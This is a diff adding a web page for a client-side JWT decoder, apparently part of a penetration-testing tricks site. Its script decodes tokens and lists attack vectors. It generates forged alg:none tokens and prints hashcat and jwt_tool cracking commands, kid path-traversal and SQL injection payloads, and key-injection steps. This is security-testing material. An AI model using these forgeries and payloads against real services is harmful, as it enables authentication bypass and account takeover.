@@ -1,0 +1,452 @@
+{% extends "base.html" %}
+{% block title %}JWT Decoder — p3ta-tricks{% endblock %}
+{% block content %}
+<div class="tool-page">
+  <div class="tool-header">
+    <h1 class="tool-title">🎫 JWT Decoder</h1>
+    <p class="tool-desc">Client-side only — nothing leaves your browser. Decodes, validates, and surfaces attack vectors.</p>
+  </div>
+
+  <div class="jwt-input-wrap">
+    <div class="enc-input-toolbar">
+      <span class="enc-label-main">JSON Web Token</span>
+      <div class="enc-toolbar-btns">
+        <button id="jwt-paste-btn" class="enc-tool-btn">Paste</button>
+        <button id="jwt-clear-btn" class="enc-tool-btn">Clear</button>
+        <button id="jwt-sample-btn" class="enc-tool-btn">Sample JWT</button>
+      </div>
+    </div>
+    <textarea id="jwt-input" class="enc-textarea jwt-token-area" placeholder="Paste a JWT here: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature" spellcheck="false" autocomplete="off"></textarea>
+  </div>
+
+  <div id="jwt-status" class="jwt-status"></div>
+
+  <div id="jwt-result" style="display:none">
+    <div class="jwt-panels">
+      <!-- Header panel -->
+      <div class="jwt-panel">
+        <div class="jwt-panel-head">
+          <span class="jwt-panel-title">Header</span>
+          <button class="jwt-panel-copy" data-target="jwt-header-json">copy</button>
+        </div>
+        <div class="jwt-panel-body">
+          <div id="jwt-header-json" class="jwt-json"></div>
+        </div>
+      </div>
+
+      <!-- Payload panel -->
+      <div class="jwt-panel">
+        <div class="jwt-panel-head">
+          <span class="jwt-panel-title">Payload</span>
+          <button class="jwt-panel-copy" data-target="jwt-payload-json">copy</button>
+        </div>
+        <div class="jwt-panel-body">
+          <div id="jwt-payload-json" class="jwt-json"></div>
+        </div>
+      </div>
+
+      <!-- Claims table -->
+      <div class="jwt-panel jwt-panel-full">
+        <div class="jwt-panel-head">
+          <span class="jwt-panel-title">Standard Claims</span>
+        </div>
+        <div class="jwt-panel-body">
+          <table class="jwt-claims-table" id="jwt-claims-table">
+            <thead><tr><th>Claim</th><th>Value</th></tr></thead>
+            <tbody id="jwt-claims-tbody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Signature panel -->
+      <div class="jwt-panel jwt-panel-full">
+        <div class="jwt-panel-head">
+          <span class="jwt-panel-title">Signature (Base64url)</span>
+          <button class="jwt-panel-copy" data-target="jwt-sig-val">copy</button>
+        </div>
+        <div class="jwt-panel-body">
+          <div id="jwt-sig-val" class="jwt-json" style="color:var(--purple)"></div>
+        </div>
+      </div>
+
+      <!-- Attack surface panel -->
+      <div class="jwt-panel jwt-panel-full">
+        <div class="jwt-panel-head">
+          <span class="jwt-panel-title">⚔ Attack Surface</span>
+        </div>
+        <div class="jwt-panel-body">
+          <div id="jwt-attacks" class="jwt-attacks"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="jwt-empty" class="jwt-empty">Paste a JWT above to begin analysis.</div>
+</div>
+
+<script>
+(function () {
+  'use strict';
+
+  /* ── helpers ── */
+  function b64uDecode(str) {
+    str = str.replace(/-/g, '+').replace(/_/g, '/');
+    while (str.length % 4) str += '=';
+    try { return atob(str); } catch { return null; }
+  }
+
+  function tryParseJSON(raw) {
+    try { return JSON.parse(raw); } catch { return null; }
+  }
+
+  function fmtDate(ts) {
+    const d = new Date(ts * 1000);
+    return d.toISOString().replace('T', ' ').replace('.000Z', ' UTC');
+  }
+
+  function escHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  function syntaxJSON(obj) {
+    const raw = JSON.stringify(obj, null, 2);
+    return raw.replace(
+      /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g,
+      function (match) {
+        let cls = 'jn';
+        if (/^"/.test(match)) {
+          cls = /:$/.test(match) ? 'jk' : 'js';
+        } else if (/true|false/.test(match)) {
+          cls = 'jb';
+        }
+        return `<span class="${cls}">${escHtml(match)}</span>`;
+      }
+    );
+  }
+
+  function badge(text, type) {
+    return `<span class="jwt-badge jwt-badge-${type}">${escHtml(text)}</span>`;
+  }
+
+  const KNOWN_CLAIMS = {
+    iss: 'Issuer',
+    sub: 'Subject',
+    aud: 'Audience',
+    exp: 'Expiration',
+    nbf: 'Not Before',
+    iat: 'Issued At',
+    jti: 'JWT ID',
+    azp: 'Authorized Party',
+    scope: 'Scope',
+    roles: 'Roles',
+    groups: 'Groups',
+    email: 'Email',
+    name: 'Name',
+    preferred_username: 'Username',
+    given_name: 'Given Name',
+    family_name: 'Family Name',
+    sid: 'Session ID',
+    acr: 'Auth Context',
+    amr: 'Auth Methods',
+    nonce: 'Nonce',
+    at_hash: 'Access Token Hash',
+    c_hash: 'Code Hash',
+  };
+
+  function buildClaimsTable(payload) {
+    const now = Math.floor(Date.now() / 1000);
+    const rows = [];
+
+    Object.entries(payload).forEach(([k, v]) => {
+      const label = KNOWN_CLAIMS[k] || k;
+      let valHtml = '';
+      let hint = '';
+
+      if ((k === 'exp' || k === 'nbf' || k === 'iat') && typeof v === 'number') {
+        const dateStr = fmtDate(v);
+        if (k === 'exp') {
+          const expired = v < now;
+          const cls = expired ? 'jwt-claim-expired' : 'jwt-claim-valid';
+          valHtml = `<span class="${cls}">${escHtml(String(v))}</span>`;
+          hint = `<span class="jwt-claim-hint">${dateStr} — ${expired ? '⛔ EXPIRED' : '✅ Valid'}</span>`;
+        } else if (k === 'nbf') {
+          const active = v <= now;
+          valHtml = escHtml(String(v));
+          hint = `<span class="jwt-claim-hint">${dateStr} — ${active ? '✅ Active' : '⏳ Not yet valid'}</span>`;
+        } else {
+          valHtml = escHtml(String(v));
+          hint = `<span class="jwt-claim-hint">${dateStr}</span>`;
+        }
+      } else if (Array.isArray(v)) {
+        valHtml = escHtml(JSON.stringify(v));
+      } else if (typeof v === 'object' && v !== null) {
+        valHtml = escHtml(JSON.stringify(v));
+      } else {
+        valHtml = escHtml(String(v));
+      }
+
+      rows.push(`<tr><td>${escHtml(k)}<span class="jwt-claim-hint">${escHtml(label)}</span></td><td>${valHtml}${hint}</td></tr>`);
+    });
+
+    return rows.join('');
+  }
+
+  function buildAttacks(header, payload, parts) {
+    const now = Math.floor(Date.now() / 1000);
+    const alg = (header.alg || '').toUpperCase();
+    const attacks = [];
+
+    /* alg:none */
+    const noneHeader = Object.assign({}, header, { alg: 'none' });
+    const noneB64 = btoa(JSON.stringify(noneHeader)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+    const payloadB64 = parts[1];
+    attacks.push({
+      sev: 'danger',
+      icon: '💥',
+      title: 'Algorithm None Attack',
+      desc: 'Set alg to "none" and strip the signature. Some libraries skip verification for this algorithm.',
+      cmd: `# Forged token (no signature):\n${noneB64}.${payloadB64}.`,
+    });
+
+    /* RS256 → HS256 confusion */
+    if (alg === 'RS256' || alg === 'RS384' || alg === 'RS512' || alg === 'ES256' || alg === 'ES384' || alg === 'ES512') {
+      attacks.push({
+        sev: 'danger',
+        icon: '🔀',
+        title: 'Algorithm Confusion (Asymmetric → HMAC)',
+        desc: `Token uses ${alg}. If the server accepts HS256 and uses the public key as the HMAC secret, you can forge tokens by signing with the RSA/EC public key.`,
+        cmd: `# Grab the public key from JWKS endpoint, then:\npython3 jwt_tool.py <JWT> -X k -pk public.pem`,
+      });
+    }
+
+    /* No expiry */
+    if (!payload.exp) {
+      attacks.push({
+        sev: 'danger',
+        icon: '♾',
+        title: 'No Expiration Claim',
+        desc: 'Token has no exp claim — it never expires. Stolen tokens are valid indefinitely.',
+        cmd: null,
+      });
+    } else if (payload.exp < now) {
+      attacks.push({
+        sev: 'warning',
+        icon: '⏰',
+        title: 'Token is Expired',
+        desc: `exp is in the past (${fmtDate(payload.exp)}). Some servers may still accept expired tokens if validation is disabled.`,
+        cmd: `# Test if server validates exp:\ncurl -H "Authorization: Bearer <expired_token>" <target>`,
+      });
+    }
+
+    /* HS256 brute-force */
+    if (alg === 'HS256' || alg === 'HS384' || alg === 'HS512') {
+      const hashFlag = alg === 'HS256' ? '' : alg === 'HS384' ? '--jwt-algorithm HS384 ' : '--jwt-algorithm HS512 ';
+      attacks.push({
+        sev: 'warning',
+        icon: '🔑',
+        title: `${alg} Secret Brute-Force`,
+        desc: 'HMAC-signed tokens can be brute-forced offline if the secret is weak.',
+        cmd: `# hashcat JWT crack:\nhashcat -a 0 -m 16500 '${parts[0]}.${parts[1]}.${parts[2]}' /usr/share/wordlists/rockyou.txt\n\n# jwt_tool dictionary attack:\npython3 jwt_tool.py '${parts[0]}.${parts[1]}.${parts[2]}' -C -d /usr/share/wordlists/rockyou.txt`,
+      });
+    }
+
+    /* kid injection */
+    if (header.kid !== undefined) {
+      attacks.push({
+        sev: 'warning',
+        icon: '💉',
+        title: 'kid Header Injection',
+        desc: `kid="${escHtml(String(header.kid))}" — if the server uses kid in a file path or SQL query to fetch the signing key, it may be vulnerable to path traversal or SQLi.`,
+        cmd: `# Path traversal kid:\n{"alg":"HS256","kid":"../../../../../../dev/null"}\n# Sign with empty string as secret\n\n# SQLi kid:\n{"alg":"HS256","kid":"x' UNION SELECT 'secret'-- -"}\n# Sign with 'secret' as HMAC key`,
+      });
+    }
+
+    /* jwk header injection */
+    if (header.jwk || header.jku || header.x5u) {
+      const hdr = header.jwk ? 'jwk' : header.jku ? 'jku' : 'x5u';
+      attacks.push({
+        sev: 'danger',
+        icon: '🌐',
+        title: `Embedded ${hdr.toUpperCase()} — Key Confusion`,
+        desc: `Token contains a ${hdr} header. If the server fetches and trusts this URL/key, you can inject your own public key and sign tokens.`,
+        cmd: `# Host your own JWKS endpoint, set ${hdr} to your server\npython3 jwt_tool.py <JWT> -X ${hdr === 'jwk' ? 'i' : 's'}`,
+      });
+    }
+
+    /* x5c injection */
+    if (header.x5c) {
+      attacks.push({
+        sev: 'danger',
+        icon: '📜',
+        title: 'x5c Certificate Injection',
+        desc: 'Token embeds an x5c certificate chain. If the server trusts the key in x5c without validating the CA chain, you can inject your own certificate.',
+        cmd: `python3 jwt_tool.py <JWT> -X c`,
+      });
+    }
+
+    /* No standard claims at all */
+    if (Object.keys(payload).length === 0) {
+      attacks.push({
+        sev: 'info',
+        icon: 'ℹ',
+        title: 'Empty Payload',
+        desc: 'No claims present — token carries no identity information. Verify server is not skipping authorization checks.',
+        cmd: null,
+      });
+    }
+
+    /* Claims to escalate */
+    const privClaims = ['role', 'roles', 'groups', 'admin', 'is_admin', 'isAdmin', 'scope', 'permissions'];
+    const found = privClaims.filter(c => payload[c] !== undefined);
+    if (found.length > 0) {
+      attacks.push({
+        sev: 'info',
+        icon: '🎭',
+        title: 'Privilege Claims Detected',
+        desc: `Payload contains: ${found.map(c => `<code>${escHtml(c)}</code>`).join(', ')}. Attempt to modify these values and re-sign (requires known/weak secret or alg confusion).`,
+        cmd: `# Modify and re-sign with jwt_tool:\npython3 jwt_tool.py <JWT> -T  # tamper mode`,
+      });
+    }
+
+    return attacks;
+  }
+
+  /* ── render ── */
+  function decode(raw) {
+    raw = raw.trim();
+
+    const statusEl = document.getElementById('jwt-status');
+    const resultEl = document.getElementById('jwt-result');
+    const emptyEl  = document.getElementById('jwt-empty');
+
+    statusEl.innerHTML = '';
+
+    if (!raw) {
+      resultEl.style.display = 'none';
+      emptyEl.style.display = '';
+      return;
+    }
+
+    const parts = raw.split('.');
+    if (parts.length !== 3) {
+      statusEl.innerHTML = badge('Not a valid JWT (expected 3 parts separated by .)', 'danger');
+      resultEl.style.display = 'none';
+      emptyEl.style.display = 'none';
+      return;
+    }
+
+    const headerRaw   = b64uDecode(parts[0]);
+    const payloadRaw  = b64uDecode(parts[1]);
+
+    if (!headerRaw || !payloadRaw) {
+      statusEl.innerHTML = badge('Base64url decode failed', 'danger');
+      resultEl.style.display = 'none';
+      emptyEl.style.display = 'none';
+      return;
+    }
+
+    const header  = tryParseJSON(headerRaw);
+    const payload = tryParseJSON(payloadRaw);
+
+    if (!header || !payload) {
+      statusEl.innerHTML = badge('JSON parse failed', 'danger');
+      resultEl.style.display = 'none';
+      emptyEl.style.display = 'none';
+      return;
+    }
+
+    /* status badges */
+    const badges = [];
+    const alg = header.alg || 'none';
+    const algType = /^HS/.test(alg) ? 'warning' : /^RS|^ES|^PS/.test(alg) ? 'info' : alg === 'none' ? 'danger' : 'info';
+    badges.push(badge('alg: ' + alg, algType));
+
+    if (header.typ) badges.push(badge(header.typ, 'info'));
+
+    const now = Math.floor(Date.now() / 1000);
+    if (payload.exp) {
+      badges.push(payload.exp < now ? badge('EXPIRED', 'expired') : badge('VALID', 'valid'));
+    } else {
+      badges.push(badge('NO EXPIRY', 'warning'));
+    }
+
+    if (header.kid !== undefined) badges.push(badge('kid present', 'warning'));
+    if (header.jwk || header.jku || header.x5u) badges.push(badge('key injection header', 'danger'));
+    if (alg === 'none' || alg === 'NONE') badges.push(badge('⚠ alg:none', 'danger'));
+
+    statusEl.innerHTML = badges.join(' ');
+
+    /* panels */
+    document.getElementById('jwt-header-json').innerHTML  = syntaxJSON(header);
+    document.getElementById('jwt-payload-json').innerHTML = syntaxJSON(payload);
+    document.getElementById('jwt-sig-val').textContent    = parts[2];
+
+    /* claims table */
+    const tbody = document.getElementById('jwt-claims-tbody');
+    tbody.innerHTML = buildClaimsTable(payload);
+
+    /* attacks */
+    const attacksEl = document.getElementById('jwt-attacks');
+    const attacks = buildAttacks(header, payload, parts);
+    if (!attacks.length) {
+      attacksEl.innerHTML = '<div class="jwt-empty" style="padding:1rem">No obvious attack vectors detected.</div>';
+    } else {
+      attacksEl.innerHTML = attacks.map(a => `
+        <div class="jwt-attack-item ${escHtml(a.sev)}">
+          <div class="jwt-attack-icon">${a.icon}</div>
+          <div class="jwt-attack-body">
+            <div class="jwt-attack-title">${escHtml(a.title)}</div>
+            <div class="jwt-attack-desc">${a.desc}</div>
+            ${a.cmd ? `<code class="jwt-attack-cmd">${escHtml(a.cmd)}</code>` : ''}
+          </div>
+        </div>`).join('');
+    }
+
+    resultEl.style.display = '';
+    emptyEl.style.display  = 'none';
+  }
+
+  /* ── copy buttons ── */
+  document.querySelectorAll('.jwt-panel-copy').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const target = document.getElementById(btn.dataset.target);
+      if (!target) return;
+      const text = target.textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        const orig = btn.textContent;
+        btn.textContent = 'copied!';
+        setTimeout(() => { btn.textContent = orig; }, 1200);
+      });
+    });
+  });
+
+  /* ── toolbar ── */
+  const input = document.getElementById('jwt-input');
+
+  document.getElementById('jwt-paste-btn').addEventListener('click', async () => {
+    try {
+      const t = await navigator.clipboard.readText();
+      input.value = t;
+      decode(t);
+    } catch { input.focus(); }
+  });
+
+  document.getElementById('jwt-clear-btn').addEventListener('click', () => {
+    input.value = '';
+    decode('');
+  });
+
+  document.getElementById('jwt-sample-btn').addEventListener('click', () => {
+    /* sample: alg HS256, expired exp, roles claim, kid */
+    const sample = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InYxIn0.eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkpvaG4gRG9lIiwiZW1haWwiOiJqb2huQGV4YW1wbGUuY29tIiwicm9sZXMiOlsidXNlciJdLCJpYXQiOjE3MDA0MzIwMDAsImV4cCI6MTcwMDQzNTYwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
+    input.value = sample;
+    decode(sample);
+  });
+
+  input.addEventListener('input', () => decode(input.value));
+  input.addEventListener('paste', e => {
+    setTimeout(() => decode(input.value), 0);
+  });
+})();
+</script>
+{% endblock %}
